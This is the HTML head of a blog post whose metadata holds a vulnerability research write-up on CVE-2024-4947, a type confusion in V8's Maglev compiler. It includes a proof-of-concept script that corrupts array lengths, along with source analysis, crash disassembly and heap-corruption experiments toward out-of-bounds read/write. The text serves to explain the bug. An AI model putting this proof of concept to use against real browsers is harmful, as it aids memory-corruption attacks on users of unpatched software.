<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href="//cdn.staticfile.net/Primer/21.0.7/primer.css" rel="stylesheet" />
    <link rel="icon" href="https://www.svgrepo.com/show/398339/smiling-face-with-open-mouth-and-cold-sweat.svg"><script>
        let theme = localStorage.getItem("meek_theme") || "light";
        document.documentElement.setAttribute("data-color-mode", theme);
    </script>
<meta name="description" content="author: [@buptdsb](https://x.com/buptdsb), [@mistymntncop](https://x.com/mistymntncop) 
2024-05-19 09:07:47

# Info

https://chromereleases.googleblog.com/2024/05/stable-channel-update-for-desktop_15.html
[TBD][340221135] High CVE-2024-4947: Type Confusion in V8. Reported by Vasily Berdnikov (@vaber_b) and Boris Larin (@oct0xor) of Kaspersky on 2024-05-13
Google is aware that an exploit for CVE-2024-4947 exists in the wild.

https://chromium-review.googlesource.com/c/v8/v8/+/5534518

git checkout 473318dfdb09464902c7633cad03b16431145800 -b CVE-2024-4947

# PoC

```22.mjs
// run with: `/d8 --allow-natives-syntax --maglev --expose-gc --soft-abort --trace-deopt 22.mjs`
import * as ns from "./22.mjs";

export let c = 0;

function to_fast(o) {
  var dummy = {'unique':5};
  dummy.__proto__ = o;                                                                                                                                                                                                                 
  dummy.__proto__ = o; //OptimizeAsFastPrototype
}
to_fast(ns);

function store(target, v) {
  target.c = v;
}

function createObject() {
  let a = {};
  a.i1 = 1;
  a.i2 = 1;
  a.i3 = 1;
  a.i4 = 1;
  // -----------------
  for (let i = 0; i < 8; i++) {
    a[`p${i}`] = 1;
  }
  return a;
}

function init() {
  let a = createObject();
  a.__proto__ = ns;
  // %DebugPrint(a);
  return a;
}

(function() {
  %PrepareFunctionForOptimization(store);
  store(init(), 0);
  
  %OptimizeMaglevOnNextCall(store);
  store(init(), 0);
})();

function confuse_properties_map(arg) {
  store(arg, 0x1);
}

let a = init();
let arr = [];
arr.push(1.1);
let arr2 = [{}];
confuse_properties_map(a);

gc();

// %DebugPrint(a);
// %DebugPrint(arr);

a.p5 = 1024;
a.p7 = 1024;
%DebugPrint(arr);

// %SystemBreak();
```
![image](https://github.com/zckevin/blog/assets/666724/d27db6bb-e34f-4a27-8681-7f689bb1c5cf)

# where bug happens
## source code
```
PropertyAccessInfo AccessorAccessInfoHelper() {
  ...
  return PropertyAccessInfo::ModuleExport(zone, receiver_map,
                                            cell_ref.value());
}


PropertyAccessInfo PropertyAccessInfo::ModuleExport(Zone* zone,
                                                    MapRef receiver_map,
                                                    CellRef cell) {
  return PropertyAccessInfo(zone, kModuleExport, {} /* holder */,
                            cell /* constant */, {} /* api_holder */,
                            {} /* name */, {{receiver_map}, zone});
}


ReduceResult MaglevGraphBuilder::TryBuildStoreField(...) {
  ...
  ValueNode* store_target;
  if (field_index.is_inobject()) {    <--- false
    store_target = receiver;
  } else {
    // The field is in the property array, first load it from there.
    store_target = AddNewNode<LoadTaggedField>({receiver}, JSReceiver::kPropertiesOrHashOffset);
  }
...
  if (field_representation.IsSmi()) {     <------ field_representation is `none` for a `kModuleExport` AccessInfo
    ...
  } else if (value->use_double_register()) {
    ...
  } else {
    BuildStoreTaggedField(store_target, value, field_index.offset()); <---------- field index offset is 0
  }

}
```
## crash site
```
0x7fe1e00001d6   196  8b7803               movl rdi,[rax+0x3]                                                                                                                                                                 
0x7fe1e00001d9   199  4903fe               REX.W addq rdi,r14                                                                                                                                                                          
...
0x7fe1e0000225   1e5  8947ff               movl [rdi-0x1],rax           <--- crash                                                                  
```

$rax is the receiver, [rax+0x3] is receiver’s properties

$r14 seems like to be the ptr compression cage base pointer?
![image](https://github.com/zckevin/blog/assets/666724/98887842-3f31-48ed-9f58-31375e4dbb22)

`properties` is a FixedArray, as the write offset is 0, we are writing to `FixedArray`’s map, which lives in ReadOnlySpace:
![image](https://github.com/zckevin/blog/assets/666724/824e7000-1a29-43ac-b768-d12099dc0ae6)
![image](https://github.com/zckevin/blog/assets/666724/526a5952-7455-47a0-9626-394015c3eeab)

Now we have a primitive: `mov [[object_addr + 4] + 0], rax`,
which means we could write any integer into a jsobject’s propertyarray’s map field

# Research timeline
## Failed attempt 1: an oob write using hash value write
As we have a type confusion primitive, then i open the map.h layout, 
seems like the only field which could be used in a PropertyArray map is `instance_type`.
Other fields are for JSObjects.

For maglev optimization to work, we MUST have a fast jsobject, 
For a fast jsobject, it could be confused with a dict mode jsobject, which instance_type is dict.
![image](https://github.com/zckevin/blog/assets/666724/fe5120c2-2448-4216-a5e2-8251605fd780)


So we start grep code with `IsPropertyArray()`:

Try confuse a fast PropertyArray -> Dictionary, then set hash on this fast object,
as the hash store position is different in these two types, we MAY write oob into another array’s length field.
Although the hash value is a random smi, in most times it’s value is greater than 0, so it’s ok to be an array’s length.
![image](https://github.com/zckevin/blog/assets/666724/4cff4269-0d60-4e52-ade9-a745369f4cf1)


Now we have another primitive:
oob write any **smi value** into field index 4(the 5th element) of a propertyarray

### failed code snippet 1
demo code using sandbox api:
```
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

let dict = {};
dict.a = 1;
delete dict.a;

let dict_properties = memory.getUint32(Sandbox.getAddressOf(dict) + 4, true);
let dict_properties_map_addr = memory.getUint32(dict_properties - 1, true);

let foo = {};
foo.p1 = 1;
foo.p2 = 1;
foo.p3 = 1;
foo.p4 = 1;
foo.p5 = 1;
%DebugPrint(foo);

let properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);
memory.setUint32(properties - 1, dict_properties_map_addr, true);

const ws = new WeakSet();
ws.add(foo);

%SystemBreak();
```

The fixedarray set aborts in `CodeStubAssembler::FixedArrayBoundsCheck()`, it’s a CSA_CHECK, not DCHECK.
Cause we will load hash value and compare the value with kNoHashSentinel(int value 0) first,
the fixedarray load in CSA has bound check enabled by default. 
![image](https://github.com/zckevin/blog/assets/666724/ce6864c6-f6c1-4dfc-90d4-3d55cc009392)


### create hash take 2
Find that we could use map normalization to trigger hash creation:
```
function set_hash(arg) {
    let sb = {a2222222221: 1, a2222222222 : 1};
    sb.__proto__ = arg;
    delete sb.a2222222222;
}
set_hash(obj);
```
![image](https://github.com/zckevin/blog/assets/666724/d816dea9-9d16-49fd-96cb-7358d9db5d78)


### try to create 1-length PropertyArray
This hash value oob write is quite weak:
write smi only, we can’t change any map address to trigger confusion
cause we are doing a CAS alike operation, the hash creation function’s check part needs the field value to be 0 at first
since most propertyarrays has unused elements allocated, we could only write to the second field of the adjacent v8 object
prototype_maps can have 1-length PropertyArray, but can't have transition-tree, so can't be optizmized by ML/TF
![image](https://github.com/zckevin/blog/assets/666724/317b9b96-6204-43dd-a3da-c2bd6026ffa1)


Most FixedArrays have a `empty_fixed_array()` alike objects in heap roots

- Other objects like fixedarray:
- Regex match info
- feedback vector
- ...

Seems too internal to be controlled from user js

## Failed attempt 2: using gc
Two objects are located adjacently after gc, 
if one propertyarray’s length is shrinked, the jsarray’s length is intact,
then we may trigger a oob read?

Demo:
```
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

let foo = {};
let bar = {};
foo.p1 = 1;
foo.p2 = 1;
foo.p3 = 1;
foo.p4 = 1;
// ---------
foo.p5 = 1;
foo.p6 = 1;
foo.p7 = 1;
foo.p8 = 1;

bar.p1 = 1;
bar.p2 = 1;
bar.p3 = 1;
bar.p4 = 1;
bar.p5 = 1;

%DebugPrint(foo);
%DebugPrint(bar);

properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);
memory.setUint32(properties - 1 + 4, 0x6, true);

// %DebugPrint(foo.p8);

gc();

%DebugPrint(foo);
%DebugPrint(bar);

properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);
memory.setUint32(properties - 1 + 4, 0x12, true);

%DebugPrint(foo.p8);

%SystemBreak();
```

As we can only override the propertyarray’s map, not the propertyarray itself
and the map of it has variable length(which is 0)

## gc take 2
We could confuse a propertyarray’s map -> heapnumber’s map,
then trigger a gc, then the propertyarray’s body would shrink and we have a oob read/write.

Since most (internal) maps are copied from the snapshot blob into heap, and there addresses are fixed.
(the addrs may differ in different chrome versions?)

![image](https://github.com/zckevin/blog/assets/666724/a57124c9-9c8d-4ea4-aacf-27da912f25bd)


we could create a layout graph:
```
-------------
jsobject’s properties map
length
<body>
-------------
jsarray map
properties ptr
elements ptr
length            <- p5
-------------
jsarray’s elements map
length            <- p7
<body>
-------------
```

before gc:
![image](https://github.com/zckevin/blog/assets/666724/adb52099-16d5-405f-813c-65d3e0688a09)


after gc:
![image](https://github.com/zckevin/blog/assets/666724/11aebdc1-6174-427a-8c0a-2c6dcd0e3a45)

## gc after PropertyArray type confused with a string
After calling `confuse_properties_map(a)`, we have set properties map ptr into 0x2f0000000002 (smi value)

Then in gc(), it would take the memory range from 0x2f0000000002-1 as a Map.
Other fields are irrelevant except the `instance_type`, since that decides which apply function to call.
If it’s not a valid type, the large switch loop would fall into default case and abort.

As the `instance_type` is 0 for now, it’s `INTERNALIZED_TWO_BYTE_STRING_TYPE`, 
so we will call `CALL_APPLY(SeqTwoByteString)` to gc this object.

For SeqTwoByteString, the `IterateBody` is a no-op. GC just move the whole string range from one place
to another.

The layout of a js string is: `map | raw_hash_field | int32 length | ...`
So the length of this string is 0x02, the whole length of the heapobject is 16(3 * 4 + 2 * 2),
then after gc, propertyarray would have 2 elements inside, other elements are dropped.

pic: <the map from 0x2f0000000002-1>
![image](https://github.com/zckevin/blog/assets/666724/8bc8b4d7-8210-4e80-855a-2fcc76b448e7)

pic:
<SeqTwoByteString, map / raw_hash_field / length / string body>
<PropertyArray, map / length / element 0 / element 1>
![image](https://github.com/zckevin/blog/assets/666724/7c36c2af-e6de-49f3-bd91-041520c94b17)


```
template <typename ObjectVisitor>
void HeapObject::IterateBodyFast(PtrComprCageBase cage_base, ObjectVisitor* v) {
  Tagged<Map> m = map(cage_base);
  IterateBodyFast(m, SizeFromMap(m), v);
}

template <typename ObjectVisitor>
void HeapObject::IterateBodyFast(Tagged<Map> map, int object_size,
                                 ObjectVisitor* v) {
  BodyDescriptorApply<CallIterateBody>(map->instance_type(), map, *this,
                                       object_size, v);
}

template <typename Op, typename... Args>
auto BodyDescriptorApply(InstanceType type, Args&&... args) {
  switch (type) {
      case kSeqStringTag:
          return CALL_APPLY(SeqOneByteString);
    ...
    default:
UNREACHABLE();	
  }
}

class SeqOneByteString::BodyDescriptor final : public DataOnlyBodyDescriptor {
  ...
}

class DataOnlyBodyDescriptor : public BodyDescriptorBase {
 public:
  template <typename ObjectVisitor>
  static inline void IterateBody(Tagged<Map> map, Tagged<HeapObject> obj,
                                 int object_size, ObjectVisitor* v) {}      <-------- noop here
};

template <class Visitor>
void LiveObjectVisitor::VisitMarkedObjectsNoFail(PageMetadata* page,
                                                 Visitor* visitor) {
  for (auto [object, size] : LiveObjectRange(page)) {
    const bool success = visitor->Visit(object, size);
   }
}

bool LiveObjectRange::iterator::AdvanceToNextMarkedObject() {
  ...
        current_size_ = ALIGN_TO_ALLOCATION_ALIGNMENT(
          current_object_->SizeFromMap(current_map_));
}

int HeapObject::SizeFromMap(Tagged<Map> map) const {
  ...
  if (instance_type == SEQ_TWO_BYTE_STRING_TYPE ||
      instance_type == INTERNALIZED_TWO_BYTE_STRING_TYPE ||
      instance_type == SHARED_SEQ_TWO_BYTE_STRING_TYPE) {
    // Strings may get concurrently truncated, hence we have to access its
    // length synchronized.
    return SeqTwoByteString::SizeFor(
        SeqTwoByteString::unchecked_cast(*this)->length(kAcquireLoad));
  }
}

V8_INLINE constexpr int32_t SeqTwoByteString::SizeFor(int32_t length) {
  return OBJECT_POINTER_ALIGN(SeqTwoByteString::DataSizeFor(length));
}
```

Stack trace for gc:
```
#0  v8::internal::CallIterateBody::apply<v8::internal::SeqOneByteString::BodyDescriptor, false, v8::internal::RecordMigratedSlotVisitor> (map=..., obj=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1506
#1  0x00007f6ecd5be46e in v8::internal::BodyDescriptorApply<v8::internal::CallIterateBody, v8::internal::Tagged<v8::internal::Map>&, v8::internal::HeapObject&, int&, v8::internal::RecordMigratedSlotVisitor*&> (type=v8::internal::SEQ_ONE_BYTE_STRING_TYPE, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1165
#2  0x00007f6ecd5be3b5 in v8::internal::HeapObject::IterateBodyFast<v8::internal::RecordMigratedSlotVisitor> (this=0x7fff5e1920f8, map=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1512
#3  0x00007f6ecd5cf6e4 in v8::internal::HeapObject::IterateFast<v8::internal::RecordMigratedSlotVisitor> (this=0x7fff5e1920f8, map=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1479
#4  0x00007f6ecd5cef02 in v8::internal::EvacuateVisitorBase::RawMigrateObject<(v8::internal::EvacuateVisitorBase::MigrationMode)0> (base=0x5635fee63598, dst=..., src=..., size=20, dest=v8::internal::OLD_SPACE) at ../../src/heap/mark-compact.cc:1503
#5  0x00007f6ecd5d0374 in v8::internal::EvacuateVisitorBase::MigrateObject (this=0x5635fee63598, dst=..., src=..., size=20, dest=v8::internal::OLD_SPACE) at ../../src/heap/mark-compact.cc:1626
#6  0x00007f6ecd5d0138 in v8::internal::EvacuateVisitorBase::TryEvacuateObject (this=0x5635fee63598, target_space=v8::internal::OLD_SPACE, object=..., size=20, target_object=0x7fff5e1922e0) at ../../src/heap/mark-compact.cc:1602
#7  0x00007f6ecd5cea9f in v8::internal::EvacuateNewSpaceVisitor::Visit (this=0x5635fee63598, object=..., size=20) at ../../src/heap/mark-compact.cc:1669
#8  0x00007f6ecd5b2761 in v8::internal::LiveObjectVisitor::VisitMarkedObjectsNoFail<v8::internal::EvacuateNewSpaceVisitor> (page=0x5635fee4fd40, visitor=0x5635fee63598) at ../../src/heap/mark-compact.cc:4235
#9  0x00007f6ecd5901e4 in v8::internal::Evacuator::RawEvacuatePage (this=0x5635fee62bd0, page=0x5635fee4fd40) at ../../src/heap/mark-compact.cc:4253
#10 0x00007f6ecd58fe80 in v8::internal::Evacuator::EvacuatePage (this=0x5635fee62bd0, page=0x5635fee4fd40) at ../../src/heap/mark-compact.cc:4162
```。">
<meta property="og:title" content="CVE-2024-4947: v8 incorrect AccessInfo for module namespace object causes Maglev type confusion">
<meta property="og:description" content="author: [@buptdsb](https://x.com/buptdsb), [@mistymntncop](https://x.com/mistymntncop) 
2024-05-19 09:07:47

# Info

https://chromereleases.googleblog.com/2024/05/stable-channel-update-for-desktop_15.html
[TBD][340221135] High CVE-2024-4947: Type Confusion in V8. Reported by Vasily Berdnikov (@vaber_b) and Boris Larin (@oct0xor) of Kaspersky on 2024-05-13
Google is aware that an exploit for CVE-2024-4947 exists in the wild.

https://chromium-review.googlesource.com/c/v8/v8/+/5534518

git checkout 473318dfdb09464902c7633cad03b16431145800 -b CVE-2024-4947

# PoC

```22.mjs
// run with: `/d8 --allow-natives-syntax --maglev --expose-gc --soft-abort --trace-deopt 22.mjs`
import * as ns from "./22.mjs";

export let c = 0;

function to_fast(o) {
  var dummy = {'unique':5};
  dummy.__proto__ = o;                                                                                                                                                                                                                 
  dummy.__proto__ = o; //OptimizeAsFastPrototype
}
to_fast(ns);

function store(target, v) {
  target.c = v;
}

function createObject() {
  let a = {};
  a.i1 = 1;
  a.i2 = 1;
  a.i3 = 1;
  a.i4 = 1;
  // -----------------
  for (let i = 0; i < 8; i++) {
    a[`p${i}`] = 1;
  }
  return a;
}

function init() {
  let a = createObject();
  a.__proto__ = ns;
  // %DebugPrint(a);
  return a;
}

(function() {
  %PrepareFunctionForOptimization(store);
  store(init(), 0);
  
  %OptimizeMaglevOnNextCall(store);
  store(init(), 0);
})();

function confuse_properties_map(arg) {
  store(arg, 0x1);
}

let a = init();
let arr = [];
arr.push(1.1);
let arr2 = [{}];
confuse_properties_map(a);

gc();

// %DebugPrint(a);
// %DebugPrint(arr);

a.p5 = 1024;
a.p7 = 1024;
%DebugPrint(arr);

// %SystemBreak();
```
![image](https://github.com/zckevin/blog/assets/666724/d27db6bb-e34f-4a27-8681-7f689bb1c5cf)

# where bug happens
## source code
```
PropertyAccessInfo AccessorAccessInfoHelper() {
  ...
  return PropertyAccessInfo::ModuleExport(zone, receiver_map,
                                            cell_ref.value());
}


PropertyAccessInfo PropertyAccessInfo::ModuleExport(Zone* zone,
                                                    MapRef receiver_map,
                                                    CellRef cell) {
  return PropertyAccessInfo(zone, kModuleExport, {} /* holder */,
                            cell /* constant */, {} /* api_holder */,
                            {} /* name */, {{receiver_map}, zone});
}


ReduceResult MaglevGraphBuilder::TryBuildStoreField(...) {
  ...
  ValueNode* store_target;
  if (field_index.is_inobject()) {    <--- false
    store_target = receiver;
  } else {
    // The field is in the property array, first load it from there.
    store_target = AddNewNode<LoadTaggedField>({receiver}, JSReceiver::kPropertiesOrHashOffset);
  }
...
  if (field_representation.IsSmi()) {     <------ field_representation is `none` for a `kModuleExport` AccessInfo
    ...
  } else if (value->use_double_register()) {
    ...
  } else {
    BuildStoreTaggedField(store_target, value, field_index.offset()); <---------- field index offset is 0
  }

}
```
## crash site
```
0x7fe1e00001d6   196  8b7803               movl rdi,[rax+0x3]                                                                                                                                                                 
0x7fe1e00001d9   199  4903fe               REX.W addq rdi,r14                                                                                                                                                                          
...
0x7fe1e0000225   1e5  8947ff               movl [rdi-0x1],rax           <--- crash                                                                  
```

$rax is the receiver, [rax+0x3] is receiver’s properties

$r14 seems like to be the ptr compression cage base pointer?
![image](https://github.com/zckevin/blog/assets/666724/98887842-3f31-48ed-9f58-31375e4dbb22)

`properties` is a FixedArray, as the write offset is 0, we are writing to `FixedArray`’s map, which lives in ReadOnlySpace:
![image](https://github.com/zckevin/blog/assets/666724/824e7000-1a29-43ac-b768-d12099dc0ae6)
![image](https://github.com/zckevin/blog/assets/666724/526a5952-7455-47a0-9626-394015c3eeab)

Now we have a primitive: `mov [[object_addr + 4] + 0], rax`,
which means we could write any integer into a jsobject’s propertyarray’s map field

# Research timeline
## Failed attempt 1: an oob write using hash value write
As we have a type confusion primitive, then i open the map.h layout, 
seems like the only field which could be used in a PropertyArray map is `instance_type`.
Other fields are for JSObjects.

For maglev optimization to work, we MUST have a fast jsobject, 
For a fast jsobject, it could be confused with a dict mode jsobject, which instance_type is dict.
![image](https://github.com/zckevin/blog/assets/666724/fe5120c2-2448-4216-a5e2-8251605fd780)


So we start grep code with `IsPropertyArray()`:

Try confuse a fast PropertyArray -> Dictionary, then set hash on this fast object,
as the hash store position is different in these two types, we MAY write oob into another array’s length field.
Although the hash value is a random smi, in most times it’s value is greater than 0, so it’s ok to be an array’s length.
![image](https://github.com/zckevin/blog/assets/666724/4cff4269-0d60-4e52-ade9-a745369f4cf1)


Now we have another primitive:
oob write any **smi value** into field index 4(the 5th element) of a propertyarray

### failed code snippet 1
demo code using sandbox api:
```
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

let dict = {};
dict.a = 1;
delete dict.a;

let dict_properties = memory.getUint32(Sandbox.getAddressOf(dict) + 4, true);
let dict_properties_map_addr = memory.getUint32(dict_properties - 1, true);

let foo = {};
foo.p1 = 1;
foo.p2 = 1;
foo.p3 = 1;
foo.p4 = 1;
foo.p5 = 1;
%DebugPrint(foo);

let properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);
memory.setUint32(properties - 1, dict_properties_map_addr, true);

const ws = new WeakSet();
ws.add(foo);

%SystemBreak();
```

The fixedarray set aborts in `CodeStubAssembler::FixedArrayBoundsCheck()`, it’s a CSA_CHECK, not DCHECK.
Cause we will load hash value and compare the value with kNoHashSentinel(int value 0) first,
the fixedarray load in CSA has bound check enabled by default. 
![image](https://github.com/zckevin/blog/assets/666724/ce6864c6-f6c1-4dfc-90d4-3d55cc009392)


### create hash take 2
Find that we could use map normalization to trigger hash creation:
```
function set_hash(arg) {
    let sb = {a2222222221: 1, a2222222222 : 1};
    sb.__proto__ = arg;
    delete sb.a2222222222;
}
set_hash(obj);
```
![image](https://github.com/zckevin/blog/assets/666724/d816dea9-9d16-49fd-96cb-7358d9db5d78)


### try to create 1-length PropertyArray
This hash value oob write is quite weak:
write smi only, we can’t change any map address to trigger confusion
cause we are doing a CAS alike operation, the hash creation function’s check part needs the field value to be 0 at first
since most propertyarrays has unused elements allocated, we could only write to the second field of the adjacent v8 object
prototype_maps can have 1-length PropertyArray, but can't have transition-tree, so can't be optizmized by ML/TF
![image](https://github.com/zckevin/blog/assets/666724/317b9b96-6204-43dd-a3da-c2bd6026ffa1)


Most FixedArrays have a `empty_fixed_array()` alike objects in heap roots

- Other objects like fixedarray:
- Regex match info
- feedback vector
- ...

Seems too internal to be controlled from user js

## Failed attempt 2: using gc
Two objects are located adjacently after gc, 
if one propertyarray’s length is shrinked, the jsarray’s length is intact,
then we may trigger a oob read?

Demo:
```
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

let foo = {};
let bar = {};
foo.p1 = 1;
foo.p2 = 1;
foo.p3 = 1;
foo.p4 = 1;
// ---------
foo.p5 = 1;
foo.p6 = 1;
foo.p7 = 1;
foo.p8 = 1;

bar.p1 = 1;
bar.p2 = 1;
bar.p3 = 1;
bar.p4 = 1;
bar.p5 = 1;

%DebugPrint(foo);
%DebugPrint(bar);

properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);
memory.setUint32(properties - 1 + 4, 0x6, true);

// %DebugPrint(foo.p8);

gc();

%DebugPrint(foo);
%DebugPrint(bar);

properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);
memory.setUint32(properties - 1 + 4, 0x12, true);

%DebugPrint(foo.p8);

%SystemBreak();
```

As we can only override the propertyarray’s map, not the propertyarray itself
and the map of it has variable length(which is 0)

## gc take 2
We could confuse a propertyarray’s map -> heapnumber’s map,
then trigger a gc, then the propertyarray’s body would shrink and we have a oob read/write.

Since most (internal) maps are copied from the snapshot blob into heap, and there addresses are fixed.
(the addrs may differ in different chrome versions?)

![image](https://github.com/zckevin/blog/assets/666724/a57124c9-9c8d-4ea4-aacf-27da912f25bd)


we could create a layout graph:
```
-------------
jsobject’s properties map
length
<body>
-------------
jsarray map
properties ptr
elements ptr
length            <- p5
-------------
jsarray’s elements map
length            <- p7
<body>
-------------
```

before gc:
![image](https://github.com/zckevin/blog/assets/666724/adb52099-16d5-405f-813c-65d3e0688a09)


after gc:
![image](https://github.com/zckevin/blog/assets/666724/11aebdc1-6174-427a-8c0a-2c6dcd0e3a45)

## gc after PropertyArray type confused with a string
After calling `confuse_properties_map(a)`, we have set properties map ptr into 0x2f0000000002 (smi value)

Then in gc(), it would take the memory range from 0x2f0000000002-1 as a Map.
Other fields are irrelevant except the `instance_type`, since that decides which apply function to call.
If it’s not a valid type, the large switch loop would fall into default case and abort.

As the `instance_type` is 0 for now, it’s `INTERNALIZED_TWO_BYTE_STRING_TYPE`, 
so we will call `CALL_APPLY(SeqTwoByteString)` to gc this object.

For SeqTwoByteString, the `IterateBody` is a no-op. GC just move the whole string range from one place
to another.

The layout of a js string is: `map | raw_hash_field | int32 length | ...`
So the length of this string is 0x02, the whole length of the heapobject is 16(3 * 4 + 2 * 2),
then after gc, propertyarray would have 2 elements inside, other elements are dropped.

pic: <the map from 0x2f0000000002-1>
![image](https://github.com/zckevin/blog/assets/666724/8bc8b4d7-8210-4e80-855a-2fcc76b448e7)

pic:
<SeqTwoByteString, map / raw_hash_field / length / string body>
<PropertyArray, map / length / element 0 / element 1>
![image](https://github.com/zckevin/blog/assets/666724/7c36c2af-e6de-49f3-bd91-041520c94b17)


```
template <typename ObjectVisitor>
void HeapObject::IterateBodyFast(PtrComprCageBase cage_base, ObjectVisitor* v) {
  Tagged<Map> m = map(cage_base);
  IterateBodyFast(m, SizeFromMap(m), v);
}

template <typename ObjectVisitor>
void HeapObject::IterateBodyFast(Tagged<Map> map, int object_size,
                                 ObjectVisitor* v) {
  BodyDescriptorApply<CallIterateBody>(map->instance_type(), map, *this,
                                       object_size, v);
}

template <typename Op, typename... Args>
auto BodyDescriptorApply(InstanceType type, Args&&... args) {
  switch (type) {
      case kSeqStringTag:
          return CALL_APPLY(SeqOneByteString);
    ...
    default:
UNREACHABLE();	
  }
}

class SeqOneByteString::BodyDescriptor final : public DataOnlyBodyDescriptor {
  ...
}

class DataOnlyBodyDescriptor : public BodyDescriptorBase {
 public:
  template <typename ObjectVisitor>
  static inline void IterateBody(Tagged<Map> map, Tagged<HeapObject> obj,
                                 int object_size, ObjectVisitor* v) {}      <-------- noop here
};

template <class Visitor>
void LiveObjectVisitor::VisitMarkedObjectsNoFail(PageMetadata* page,
                                                 Visitor* visitor) {
  for (auto [object, size] : LiveObjectRange(page)) {
    const bool success = visitor->Visit(object, size);
   }
}

bool LiveObjectRange::iterator::AdvanceToNextMarkedObject() {
  ...
        current_size_ = ALIGN_TO_ALLOCATION_ALIGNMENT(
          current_object_->SizeFromMap(current_map_));
}

int HeapObject::SizeFromMap(Tagged<Map> map) const {
  ...
  if (instance_type == SEQ_TWO_BYTE_STRING_TYPE ||
      instance_type == INTERNALIZED_TWO_BYTE_STRING_TYPE ||
      instance_type == SHARED_SEQ_TWO_BYTE_STRING_TYPE) {
    // Strings may get concurrently truncated, hence we have to access its
    // length synchronized.
    return SeqTwoByteString::SizeFor(
        SeqTwoByteString::unchecked_cast(*this)->length(kAcquireLoad));
  }
}

V8_INLINE constexpr int32_t SeqTwoByteString::SizeFor(int32_t length) {
  return OBJECT_POINTER_ALIGN(SeqTwoByteString::DataSizeFor(length));
}
```

Stack trace for gc:
```
#0  v8::internal::CallIterateBody::apply<v8::internal::SeqOneByteString::BodyDescriptor, false, v8::internal::RecordMigratedSlotVisitor> (map=..., obj=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1506
#1  0x00007f6ecd5be46e in v8::internal::BodyDescriptorApply<v8::internal::CallIterateBody, v8::internal::Tagged<v8::internal::Map>&, v8::internal::HeapObject&, int&, v8::internal::RecordMigratedSlotVisitor*&> (type=v8::internal::SEQ_ONE_BYTE_STRING_TYPE, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1165
#2  0x00007f6ecd5be3b5 in v8::internal::HeapObject::IterateBodyFast<v8::internal::RecordMigratedSlotVisitor> (this=0x7fff5e1920f8, map=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1512
#3  0x00007f6ecd5cf6e4 in v8::internal::HeapObject::IterateFast<v8::internal::RecordMigratedSlotVisitor> (this=0x7fff5e1920f8, map=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1479
#4  0x00007f6ecd5cef02 in v8::internal::EvacuateVisitorBase::RawMigrateObject<(v8::internal::EvacuateVisitorBase::MigrationMode)0> (base=0x5635fee63598, dst=..., src=..., size=20, dest=v8::internal::OLD_SPACE) at ../../src/heap/mark-compact.cc:1503
#5  0x00007f6ecd5d0374 in v8::internal::EvacuateVisitorBase::MigrateObject (this=0x5635fee63598, dst=..., src=..., size=20, dest=v8::internal::OLD_SPACE) at ../../src/heap/mark-compact.cc:1626
#6  0x00007f6ecd5d0138 in v8::internal::EvacuateVisitorBase::TryEvacuateObject (this=0x5635fee63598, target_space=v8::internal::OLD_SPACE, object=..., size=20, target_object=0x7fff5e1922e0) at ../../src/heap/mark-compact.cc:1602
#7  0x00007f6ecd5cea9f in v8::internal::EvacuateNewSpaceVisitor::Visit (this=0x5635fee63598, object=..., size=20) at ../../src/heap/mark-compact.cc:1669
#8  0x00007f6ecd5b2761 in v8::internal::LiveObjectVisitor::VisitMarkedObjectsNoFail<v8::internal::EvacuateNewSpaceVisitor> (page=0x5635fee4fd40, visitor=0x5635fee63598) at ../../src/heap/mark-compact.cc:4235
#9  0x00007f6ecd5901e4 in v8::internal::Evacuator::RawEvacuatePage (this=0x5635fee62bd0, page=0x5635fee4fd40) at ../../src/heap/mark-compact.cc:4253
#10 0x00007f6ecd58fe80 in v8::internal::Evacuator::EvacuatePage (this=0x5635fee62bd0, page=0x5635fee4fd40) at ../../src/heap/mark-compact.cc:4162
```。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://zckevin.github.io/blog/post/CVE-2024-4947-%20v8%20incorrect%20AccessInfo%20for%20module%20namespace%20object%20causes%20Maglev%20type%20confusion.html">
<meta property="og:image" content="https://www.svgrepo.com/show/398339/smiling-face-with-open-mouth-and-cold-sweat.svg">
<title>CVE-2024-4947: v8 incorrect AccessInfo for module namespace object causes Maglev type confusion</title>
<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />

</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
